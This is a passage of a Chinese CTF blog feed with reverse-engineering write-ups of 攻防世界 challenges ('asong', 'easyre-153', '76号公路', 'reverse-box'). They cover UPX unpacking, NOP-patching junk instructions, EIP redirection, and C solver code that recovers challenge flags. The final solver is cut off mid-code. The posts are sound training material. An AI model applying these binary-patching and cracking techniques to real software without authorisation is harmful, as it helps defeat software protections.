2</h3><ul><li>得到一张 gif 图片， 还是老办法放在 stegesolve 工具中看看。</li><li>开始看了好几圈也没看出什么名堂，也是很久了，在red plane的页面发现很像一个二维码，带着试一试用工具截取了下来。</li><li>使用 PsQREdit 2.4.3 真的得到了 flag.  具体题没有保留下来。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;headerlink&quot; title=&quot;Reverse:&quot;&gt;&lt;/a&gt;Reverse:&lt;/h2&gt;&lt;h3 id=&quot;ViQinere&quot;&gt;&lt;a href=&quot;#ViQinere&quot; class=&quot;headerlink&quot; title=&quot;ViQinere&quot;&gt;&lt;/a&gt;ViQinere&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;64位elf文件, 载入ida后发现与以往的不同. 很多函数都没显示出来.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;linux中运行一下, 显示对flag加密, 然后是一些乱码.  后来群里通知, 这个有靶机.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;nc连接一下, 那题目的flag存放在服务器, 文件操作取出flag, 经过加密. &lt;img src=&quot;/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523203121150.png&quot; alt=&quot;image-20200523203121150&quot;&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>re 攻防世界（4）</title>
    <link href="https://www.bxnop.cn/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/"/>
    <id>https://www.bxnop.cn/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/</id>
    <published>2020-05-15T02:27:16.000Z</published>
    <updated>2020-09-17T09:16:43.792Z</updated>
    
    <content type="html"><![CDATA[<p>攻防世界刷题记录（4）。<a id="more"></a></p><h2 id="asong"><a href="#asong" class="headerlink" title="asong"></a>asong</h2><blockquote><p>自己算法不到家，逆向这个算法想半天😅</p></blockquote><h3 id="0x1分析"><a href="#0x1分析" class="headerlink" title="0x1分析"></a>0x1分析</h3><ul><li><p>下载下来三个文件。</p></li><li><p>依次看了下, 一个64位elf文件无壳, 2个文本文件.  打开文本文件后,没有头绪.  将elf文件载入ida。</p></li><li><p>整个流程开始看不清楚做什么, 多看几次明白了. 先输入字符串, 打开一个that_girl文件读信息, 最后向out文件写信息. 但这怎么和flag联系起来呢.  其实那个out文件里的就是密文, 我们找到逆向算法, 通过密文求出明文(即我们的输入, 也是flag) </p></li><li><p>下面具体分析每个函数. 第一函数: <strong>sub_400B4C</strong> 由于很简单, 直接给出函数功能.</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515112040201-1591166378815.png" alt="image-20200515112040201"></p></li><li><p><strong>sub_400B4C</strong>: 先判断, 再取 { } 之间的内容.</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515112333168-1591166382914.png" alt="image-20200515112333168"></p></li><li><p>下面下一个函数, 也是我遇到的难点开始:  <strong>v4哪里来的及 ++*(_DWORD *)(4LL * v2 + v4);语句的作用</strong></p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515113837252-1591166387143.png" alt="image-20200515113837252"></p><p><strong>sub_400936(&amp;buf)</strong>:</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515170301682-1591166983676.png" alt="image-20200515170301682"></p></li><li><p>第一次遇到, 没有经验, 后来才想到通过汇编的查看, v4即是我们传了参数 a2(也就是主函数的v3), 这是通过寄存器传递. 64位与32位程序的区别. 但该语句功能还不是很清楚.<img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515114501031-1591166391168.png" alt="image-20200515114501031"></p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515114755333-1591166411300.png" alt="image-20200515114755333"></p></li><li><p>继续看下一个函数<strong>sub_400E54</strong>:  看到这里, 就很清晰了,  就是先通过统计<strong>that_girl</strong>文件中每个字符出现的次数, 然后按照一定的顺序输入字符, 把每个字符出现的次数按一定顺序给下面的 v5 数组赋值.<strong>那所以sub_400936转换字符函数我们是不用管的.</strong></p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515115440782-1591166415194.png" alt="image-20200515115440782"></p></li><li><p>下面是2个加密函数,  我算法太菜, 逆算法想半天😅, 首先<strong>sub_400D33((unsigned __int8 *)v5);</strong></p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515120938171-1591166420082.png" alt="image-20200515120938171"></p></li><li><p>然后 <strong>sub_400DB4(v5, v4);</strong> 解释起来有点抽象……注意是一个字节, 所以多出的位要舍弃<img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515125253662-1591166423427.png" alt="image-20200515125253662"></p></li><li><p>举个例子:</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515134001272-1591166447078.png" alt="image-20200515134001272"></p></li><li><p>最后一个函数: <strong>sub_400CC0((__int64)v5, “out”, v4);</strong>将加密后的值写入 out文件. </p></li></ul><h3 id="0x2逆向解密"><a href="#0x2逆向解密" class="headerlink" title="0x2逆向解密"></a>0x2逆向解密</h3><ul><li><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida[<span class="number">152</span>];</span><br><span class="line"><span class="keyword">int</span> change[<span class="number">38</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">   <span class="number">22</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">6</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">30</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">24</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">21</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">18</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">10</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">12</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">17</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">23</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">13</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">14</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">19</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">11</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">20</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">25</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">36</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">27</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">28</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">29</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">37</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">31</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">32</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">33</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">26</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">34</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, temp = <span class="number">0</span>, lenth = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, c[<span class="number">2000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> count[<span class="number">127</span>] = &#123;<span class="number">0</span>&#125;, change_[<span class="number">38</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">fp = fopen(<span class="string">"out"</span>, <span class="string">"rb"</span>);      <span class="comment">//先从文件读取密文  </span></span><br><span class="line">lenth = fread(b, <span class="number">1</span>, <span class="number">100</span>, fp); <span class="comment">//返回读取成功个数, 确定字符个数</span></span><br><span class="line">fclose(fp);</span><br><span class="line">    </span><br><span class="line">temp = b[lenth<span class="number">-1</span>]&amp;<span class="number">7</span>; <span class="comment">//&amp;7  取后三位数据.</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = (b[i] &gt;&gt; <span class="number">3</span>) | (temp &lt;&lt; <span class="number">5</span>);</span><br><span class="line">temp = b[i]&amp;<span class="number">7</span>;<span class="comment">//从整体来看就是将整个数据右移动3位</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">fp = fopen(<span class="string">"that_girl"</span>, <span class="string">"rb"</span>); <span class="comment">//打开that_girl, 统计字符数.</span></span><br><span class="line">fread(c, <span class="number">1</span>, <span class="number">1742</span>, fp);</span><br><span class="line">fclose(fp); </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(c); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(c[i] &gt;= <span class="number">65</span> &amp;&amp; c[i] &lt;= <span class="number">90</span>)  </span><br><span class="line">c[i] += <span class="number">32</span>;<span class="comment">//因为不区分大小写, 都转换为小写</span></span><br><span class="line"></span><br><span class="line">count[c[i]]++; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(A.change[i]) </span><br><span class="line">&#123;</span><br><span class="line">change_[j++] = A.change[i];  <span class="comment">//统计每个字符出现次数</span></span><br><span class="line">i = A.change[i];  </span><br><span class="line">&#125;</span><br><span class="line">j -= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">temp = a[<span class="number">0</span>], a[<span class="number">0</span>] = a[change_[j]];  <span class="comment">//第二层解密</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth<span class="number">-2</span>; i++) <span class="comment">//按照给定赋值找到一个未变的值, 倒序赋值回去即可</span></span><br><span class="line">&#123;</span><br><span class="line">a[change_[j]] = a[change_[--j]];</span><br><span class="line">&#125;</span><br><span class="line">a[change_[j]] = temp; </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)<span class="comment">//第三层解密,比对每个字符出现的次数的顺序,进而确定输入顺序</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] == count[j])</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = j; </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"QCTF&#123;%s&#125;"</span>, flag); <span class="comment">//得到flag.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515135919513-1591166487828.png" alt="image-20200515135919513"></p></li><li><p><strong>总结: (1）算法好的话, 这道题就轻松很多。(2)注意64位程序的传递参数的方式。(3)要习惯看汇编代码。</strong></p></li></ul><hr><h2 id="easyre-153"><a href="#easyre-153" class="headerlink" title="easyre-153"></a>easyre-153</h2><blockquote><p>题其实很简单,  但差点做到自闭… 其实能猜到flag怎么算出来, 但对程序的执行想不明白.</p></blockquote><ul><li><p>32位elf文件加了upx壳, 没有修改过的, 直接upx -d脱壳成功.<img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515184107394-1591167002031.png" alt="image-20200515184107394"></p></li><li><p>ida打开, 找到主函数. 一开始就认为直接动跳控制函数的走向, 到最后一个 <strong>lol</strong> 函数得到flag. 但是动态总是在read函数卡住, 走不了, 但这里我们并不能直接跳,因为这个函数是向<strong>buf</strong>写内容, 我们最后的flag是要使用buf的内容. 然后又转 GDB 调试, 同然的结果.    纳闷这题了, 它到底是要做什么. 其实猜也是把上面 write的那部分数据作为 buf 的内容, 然后在lol函数得到 flag.  但问题是 程序到底在搞什么…..</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515185409497-1591167023660.png" alt="image-20200515185409497"></p></li><li><p>真的做到自闭, 后来才发现我忽略上面的 pipe()函数与fork()函数. 第一次见到, 百度了下, 明白了…….</p><blockquote><p>首先是管道: 1.其本质是一个伪文件(实为内核缓冲区)</p><p>​                     2.由两个文件描述符引用，一个表示读端，一个表示写端。</p><p>​                     3.规定数据从管道的写端流入管道，从读端流出</p><p>pipe()函数用于创建管道: 1.int pipe(int pipefd[2]); 成功：0；失败：-1，设置errno</p><p>​                                           2.函数调用成功返回r/w两个文件描述符。无需open，但需手动close</p><p>​                                           3.规定：fd[0] → r； fd[1] → w，就像0对应标准输入，1对应标准输出一样。</p><p>​                                           4.向管道文件读写数据其实是在读写内核缓冲区</p><p><strong>这里就是通过pipedes[1]写进内容,  从pipedes[0]写出.</strong>                    </p></blockquote><blockquote><p>然后fork()函数. 1.fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程，</p><p>​                            也就是两个进程可以做完全相同的事，但如果初始参数或者传入的变量不同，两个进程                            也可以做不同的事</p><p>​                           2.一个进程调用fork（）函数后，系统先给新的进程分配资源，例如存储数据和代码的空                           间。然后把原来的进程的所有值都复制到新的新进程中，只有少数值与原来的进程值                           不同。相当于克隆了一个自己</p><p>​                           3.调用fork函数一次, 返回2次值, 若返回0则是子进程, 若是一个数则是父进程的进程号.</p><p><strong>所以这里就是先创建一个子进程,返回值v5 == 0, 进入子进程完成写入数据后结束进程, fork()返回新的值父进程进程号,然后执行后面的操作.</strong>        </p></blockquote></li><li><p>这里动态调试这种创建进程的程序是不通畅的. 那就通过修改程序 EIP, 按照本来要执行的顺序执行一遍得到flag.(注意这样可能会有一个问题: 栈不平衡, 因为函数没有正常返回, 那会影响一些函数, 比如scanf()函数执行到了, 不会让我们输入, 而是直接跳过, 这就是堆栈有值它就直接读取了)</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515193103677-1591167041257.png" alt="image-20200515193103677"></p></li><li><p><strong>总结:(1)对于盲区的知识, 搞起来还是麻烦, 积累. (2)熟悉了修改 EIP.</strong> </p></li></ul><hr><h2 id="76号公路"><a href="#76号公路" class="headerlink" title="76号公路"></a>76号公路</h2><ul><li>题目看似很难的样子, 但自己确实被题目的信息误导了.</li><li>下载后, 2个文本一个32位无壳elf文件, 并且题目信息就给了 <strong>我们认为有份确切的文档记录了每个区域的功能，请协助找出</strong> 这个提示, 所以自己做题时始终想到怎么和文本联系起来, 找线索. 但其实不然</li><li>载入ida后, 搜索了下字符串, 找到了主函数, 但是不能转化为伪代码,  因为之前了解过点花指令,其中  <strong>E0</strong> 总是干扰代码的. 改为 <strong>90</strong> nop掉就可以了. </li><li>这里同样. 改完后, 开始读汇编代码, 逻辑很简单, 就是提示, 让我们输入字符, 进去一个函数判断.<img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200521123259003-1591167068213.png" alt="image-20200521123259003"></li><li>进去判断函数, 可以查看伪代码的. 分析一下就知道是跟着一条线按照顺序检索我们输入的字符串. 但是怎么找顺序呢, 因为文本文件还没用, 我就始终认为在文本文件找, 找了半天…….无果</li><li>最后回到程序发现, 可以找到入口点, 顺藤摸瓜的就可以找到了啊. 可以知道从索引 <strong>v2</strong> 从0开始, 直接从这里出发就好了. 直到正确退出循环.<img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200521123808376-1591167075180.png" alt="image-20200521123808376"></li><li>最后得到flag: <strong>flag{09vdf7wefijbk}</strong>.</li><li><strong>总结: (1)不要让题目把自己的思路带偏了, 思维要发散一些.</strong>  </li></ul><hr><h2 id="reverse-box"><a href="#reverse-box" class="headerlink" title="reverse-box"></a>reverse-box</h2><ul><li><p>题目下载下来，弄半天始终觉得有问题。百度发现题目少给了输出字符串。</p></li><li><p>开始再次看题，被自己坑惨了。。。因为生成数据表的函数中自己只看到了生成的随机数赋值了给了数据表的第一次元素，那整个题就有点奇怪了。看了又看，才发先最后用到了随机数生成数据的，只是屏幕容不下了。。。</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200528115958609-1591167079725.png" alt="image-20200528115958609"></p></li><li><p>另外就是先将每次生成索引值 v7 用C语言写出来后打印看看， 但大多数是负数，很大的数。这显然不对的，因为我们运行程序时输入的参数都是可打印字符 （ASCII: 32-127），伪代码不靠谱，果断去看看了汇编。</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200528121109201-1591167091052.png" alt="image-20200528121109201"></p></li><li><p>另外就是 伪代码中的 __ROR__了，看了汇编知道了 ror 指令，将数据想右位移动指定的位数。以为只是简单的  &gt;&gt; ，就这样写了整个题的爆破代码。但是始终不对，花了很时间，不甘心，就ida中动调，C语言中调试，每个步骤对比结果，才找到是 ror 这里错了。。。 原来 ror 是右移动位后会把多余的位移动到最左边，即一个圆圈转。</p></li><li><p>exp: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">generate</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> *result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v7 = <span class="number">1</span>, v2 = <span class="number">0</span>, v3 = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v4 = <span class="number">0</span>, v5 = <span class="number">0</span>, v8 = <span class="number">1</span>, v9 = <span class="number">0</span>;</span><br><span class="line">result[<span class="number">0</span>] = a;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v2 = v7 ^ <span class="number">2</span> * v7;</span><br><span class="line"><span class="keyword">if</span>((v7 &amp; <span class="number">0x80</span>) == <span class="number">0</span>)</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">v3 = <span class="number">27</span>;</span><br><span class="line">        </span><br><span class="line">v7 = v2 ^ v3;</span><br><span class="line">v7 = v7 &amp; <span class="number">0xFF</span>; </span><br><span class="line">        v4 = (<span class="number">4</span> * (<span class="number">2</span> * v8 ^ v8) ^ <span class="number">2</span> * v8 ^ v8)&amp;<span class="number">0xff</span>;</span><br><span class="line">        v9 = ((<span class="number">16</span> * v4 ^ v4)&amp;<span class="number">0xff</span>);</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> &amp;&amp; v9 &lt;= <span class="number">127</span> )</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = <span class="number">9</span>;</span><br><span class="line">    v8 = (v9 ^ v5);</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span>(v7 &lt; <span class="number">127</span>)</span><br><span class="line">    result[v7] = (((v8 &gt;&gt; <span class="number">4</span>) | ((v8 &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">4</span>)) ^ ((v8 &gt;&gt; <span class="number">5</span>) | ((v8&amp;<span class="number">0x1F</span>) &lt;&lt; <span class="number">3</span>)) ^ ((v8 &gt;&gt; <span class="number">6</span>) | ((v8&amp;<span class="number">0x3F</span>)&lt;&lt;<span class="number">2</span>) ) ^ ((v8 &gt;&gt; <span class="number">7</span>) | ((v8&amp;<span class="number">0xFF</span>)&lt;&lt;<span class="number">1</span>) ) ^ (v8 ^ a))&amp;<span class="number">0xff</span>;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">while</span>(v7 != <span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *result = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">127</span>);</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, value = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">generate(i, result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(result[<span class="number">84</span>] == <span class="number">0x95</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a); i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] &gt;= <span class="number">48</span> &amp;&amp; a[i] &lt;= <span 